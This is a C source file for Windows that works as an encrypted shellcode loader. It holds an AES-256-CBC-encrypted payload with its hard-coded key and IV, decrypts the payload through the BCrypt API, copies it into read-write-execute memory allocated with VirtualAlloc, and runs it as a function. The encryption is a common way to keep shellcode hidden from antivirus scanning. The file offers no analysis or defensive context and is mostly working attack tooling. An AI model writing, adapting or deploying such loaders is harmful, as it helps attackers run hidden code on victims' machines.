#include "Windows.h"
#include "bcrypt.h"
#include "stdio.h"
#pragma comment(lib, "bcrypt.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _AES {
    PBYTE	pPlainText;         // base address of the plain text data 
    DWORD	dwPlainSize;        // size of the plain text data

    PBYTE	pCipherText;        // base address of the encrypted data	
    DWORD	dwCipherSize;       // size of it (this can change from dwPlainSize in case there was padding)

    PBYTE	pKey;               // the 32 byte key
    PBYTE	pIv;                // the 16 byte iv
} AES, * PAES;

const unsigned char EncryptedPayload[] =
"\x95\x34\xd2\xa6\x0b\x9f\xe6\x17\xae\x8f\xa9\x06\x1b\x78\xc1\xeb"
"\x85\x76\x1b\x7f\x8b\xd9\x13\xc4\xe1\x4f\x52\x90\xe5\x27\x93\xc8"
"\x76\x1d\xcd\xc5\x70\xe9\xc3\x94\xd9\x80\x66\x32\x91\x17\x09\xfd"
"\x32\x89\xc8\x9d\xc8\x95\x88\x98\x82\x98\x21\x40\xdf\x45\xa6\x7c"
"\x43\x63\xd1\xac\x1f\x4f\xa7\xb7\x4e\xd3\x4a\x0e\x16\x8e\x20\x0b"
"\xb1\xbe\x0b\xf5\x82\x84\xbf\xcd\x94\xc9\xdc\x2f\x2f\x6f\x04\x38"
"\xbc\xc2\x5e\x67\x25\xa9\x3e\x16\xa8\xd7\x8d\x9e\x4a\x25\x4e\x72"
"\xd0\xf6\xf2\xc1\xd7\x6d\xb8\xc9\x7e\x6a\x82\xe8\x60\xca\x00\xbd"
"\x0b\x95\x98\x65\x52\x51\x04\x6d\x82\x18\xb1\x6c\x09\x0d\xa0\xb9"
"\x02\xe0\x6a\xc3\x62\x04\xe4\x08\xe5\x96\xba\xbf\x84\xab\x93\x64"
"\x2e\xe0\x37\xb6\xc9\x67\x73\x03\x39\x69\xf0\x83\xa6\xf4\x8c\x11"
"\xd6\x94\xcd\x5d\x86\xc8\x88\xc5\xac\x0a\x37\x5c\x84\x9e\x8e\x7e"
"\x1e\xf6\x74\x9e\xb1\xef\xf1\xba\xcc\x7f\x44\x02\xff\x40\xa6\x4b"
"\x89\xec\xf4\xfa\xdd\x64\xde\x71\xb0\x65\x1e\x7c\x48\x5d\x3b\xc8"
"\x7a\xa0\xf7\x13\x8b\x6e\x6c\x8f\xa2\xa6\xcc\xa1\x2e\xbb\x80\x94"
"\xac\x5e\xe0\x39\x34\xc9\xa6\xcb\x35\x9c\x08\xf8\x4c\xff\x62\xb9"
"\x07\xe8\x77\x72\x3e\x0d\x12\xce\x39\x2f\xb5\x7c\x18\xee\xef\xf9"
"\x07\x77\xa4\x91\xac\x91\x12\x68\x75\x7e\xf9\x65\xcd\x15\x76\x41";

// Key and IV for AES-256-CBC
BYTE Key[32] = {
    0xed,0x3a,0x02,0xdf,0x37,0xe8,0x63,0x0f,
    0x4b,0xa0,0x90,0xf0,0xb6,0x9f,0x41,0x1b,
    0x9c,0xa2,0xcf,0x3c,0x95,0x6b,0xbf,0xb3,
    0x3a,0x12,0xf5,0x0f,0x99,0x9a,0x42,0xa2 };

BYTE Iv[16] = {
    0x5b,0x0b,0xa9,0xb9,0x0a,0x5c,0x2b,0x83,
    0xff,0xf3,0x56,0x19,0xaf,0xb9,0x11,0xfe };

// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

    BOOL                  bSTATE = TRUE;
    BCRYPT_ALG_HANDLE     hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE     hKeyHandle = NULL;

    ULONG                 cbResult = NULL;
    DWORD                 dwBlockSize = NULL;

    DWORD                 cbKeyObject = NULL;
    PBYTE                 pbKeyObject = NULL;

    PBYTE                 pbPlainText = NULL;
    DWORD                 cbPlainText = NULL,

        // Intializing "hAlgorithm" as AES algorithm Handle
        STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Checking if block size is 16 bytes
    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Allocating memory for the key object 
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, sizeof(Key), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, sizeof(Iv), NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Allocating enough memory for the output buffer, cbPlainText
    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Running BCryptDecrypt again with pbPlainText as the output buffer
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, sizeof(Iv), pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    // Clean up
_EndOfFunc:
    if (hKeyHandle)
        BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm)
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject)
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;

}

// Wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    // Intializing the struct
    AES Aes = {
        .pKey = pKey,
        .pIv = pIv,
        .pCipherText = pCipherTextData,
        .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) {
        return FALSE;
    }

    // Saving output
    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}

typedef int (WINAPI* PayloadFunction) ();

int main() {
    PVOID pCipherTextData = NULL;
    DWORD sCipherTextSize = 0;
	SIZE_T payloadSize = sizeof(EncryptedPayload) - 1;

	if (SimpleDecryption((PVOID)EncryptedPayload, (DWORD)payloadSize, Key, Iv, &pCipherTextData, &sCipherTextSize)) {
        //printing decrypted data
        printf("Decrypted Payload:\n");
        for (SIZE_T i = 0; i < sCipherTextSize; i++) {
            if (i % 16 == 0) {
                if (i != 0) printf("\"\n");
                printf("\"");
            }
            printf("\\x%02x", ((unsigned char*)pCipherTextData)[i]);
        }
        printf("\"\n");
        //Allocating executed memory for payload
        LPVOID mem_exec = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(mem_exec, pCipherTextData, payloadSize);
        PayloadFunction func = (PayloadFunction)mem_exec;
		func();
        HeapFree(GetProcessHeap(), 0, pCipherTextData);
    }
    
    return 0;
}